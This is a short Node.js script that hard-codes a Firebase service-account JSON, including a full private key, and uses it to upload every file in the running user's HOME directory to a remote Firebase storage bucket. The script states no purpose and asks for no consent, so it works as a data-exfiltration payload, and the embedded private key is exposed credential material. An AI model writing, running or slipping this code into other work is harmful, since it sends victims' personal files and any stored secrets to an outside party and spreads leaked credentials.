const admin = require("firebase-admin");
const fs = require("fs");
const path = require("path");

// Inline Service Account JSON Key
const serviceAccount = {
  type: "service_account",
  project_id: "test-30b8e",
  private_key_id: "51cf56dd15b93ebd7785f248a5ff68dee95d0d31",
  private_key: "-----BEGIN PRIVATE KEY-----\nMIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDa5kofE5WeLX99\nQAFQ8AQpMyvMGLaPn+3kg77Xrywlb56iaMx/ove5xmXwfKBtGKHlgjgGlGdotq7m\nVpDuaiHhV1M//NQYNrDevprpQ8FG1NFsQ7f0N2GeQNF3yK5Ot1yREl3rH0RW6FCN\nng1SXbFH9D95JK9wnq8v6s14x6Tc7bXalgXanumrb1UP3RSxIEXU5rf7oH11WfQh\nCA1oXNA3MEPj6NIAaaLdqat4hmZ5oNeZAZhPsUJD9eT4e4JcV4NOWjj9mr5+4Keu\nK0SHWDxyitkg7eMwbM3Xlnm4H+y71AKqX7IM1Tl1g86YX1aJ6iIiRYQvVzu7nrYj\nVhu6W6GVAgMBAAECggEAC4iIrTx97JifF/1QVHBg976/dwByVfzqLtkWLA0JuWs5\nI3t8EtmGTd57LoGSfk0G8q26v/X/wM+nRXGYL0eeQ14zf7KVhjUTepj2VoYAX/gE\nlLy4q4Bjf1AQ+Uu0i2cz1FzwX9wE4MNawytprkZLeewPkBVzvO5Pcqnfa5axRAaV\nTbS5wpIN2m+e1ynK2kmHa+ApNnxHta6Ccg5hi7xxlQ0LS+iCvGrTuLjRyslFgWAW\n6Cmlz4A+xCuOv6eegglNhCfZ61S2DOUmOTRwub+D3ktfbuFD9K0mlwC/vBMq5qo1\n5uRyRNCwj5ZIzCVWNzTjK7QhWnRQuOdVaSfrE1WRIQKBgQDhcyKqEx0mQSiUt3Qp\nUHdKC83yxxubXwIHbV4tbAeAHJGGZWyuO9yTYj6OotccPKXLbOQRxDL+7nM0Rr1L\n4wXTLPdCoh8B5JWrlLpUNfVQbOseRgsR5OhDmiBI1gqt1ntaGvN4xpVvMKBmY/3z\ncXDHz9KV6Eh38JkMPm/Nph0M2QKBgQD4j+2UB0ebfglFJLA9S22eyTOtD+6qCp0D\nH7I1PHa5yek5PBI45w7K3QTDc/cuwk/EUED3OWr3m58XXDvwg0SGSEgxW6i14qMg\nZqTqOX75h38hErwOKr2bWsueLR5K2DcuE2/+Kqw6DKDzVJ7lKxM8eX9hve0XxpHW\nC1pjfIJ1HQKBgQDTLxTTl+AAS50F4eswIC398JzUxGo52n9+EZbcmYtVGG3BJRTv\nCSgP70GGP0edLbpomfHyKoVShG7qEzGS+nAkZsSfaFn/Xe5NsZ3w8DKBSeXcj+Qi\nuPhRCvkfAVEzkewudXyIMA0fAL/f6d6iwirRIP20asgngfr7mykDzIz90QKBgQD0\njK7DaFIkguFd/NXEyJRmmDBWgglflSebrjCoPf/VlPj4Tcjj4TjlkISiRFMa1ySh\n0g/I7N34FU12L1HttUjTEQSuQy7/HKdANpzksYLiwFPs10Dcc2KvGaqhymQ2YPoR\nRCB4ocVnK4ujPEtEz5eSdTtFkBZXwQ8012Cr5xF3ZQKBgQDBx+ZZTqaxac+bUl8T\nOzyuR9VZf4XliDZs6bRld1wHMOS/JKWEqMhxZhxpXVTJ5xTldfBRY954mH0GgMNl\nzFw2NTj49+LPszfOhl0Lf9fyAFMygv+jgbAHwkyZDvhtVsO2AaR+KZp/PtoaDF0Z\nzvc0W6oqJINXlav3a/chA86VmA==\n-----END PRIVATE KEY-----\n",
  client_email: "firebase-adminsdk-dwzul@test-30b8e.iam.gserviceaccount.com",
  client_id: "111604298940034474537",
  auth_uri: "https://accounts.google.com/o/oauth2/auth",
  token_uri: "https://oauth2.googleapis.com/token",
  auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
  client_x509_cert_url: "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-dwzul%40test-30b8e.iam.gserviceaccount.com",
  universe_domain: "googleapis.com"
};

// Initialize Firebase Admin SDK with storage bucket
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  storageBucket: "test-30b8e.appspot.com"
});

// Get reference to the storage bucket
const bucket = admin.storage().bucket();

// Directory to upload files from
const directoryPath = process.env.HOME;

// Upload all files in the directory
fs.readdir(directoryPath, (err, files) => {
  if (err) {
    return console.error("Unable to read directory:", err);
  }

  files.forEach(file => {
    const filePath = path.join(directoryPath, file);
    bucket.upload(filePath, {
      destination: file,
    })
      .then(() => {
        console.log(`Uploaded ${file} successfully.`);
      })
      .catch(err => {
        console.error(`Failed to upload ${file}:`, err);
      });
  });
});
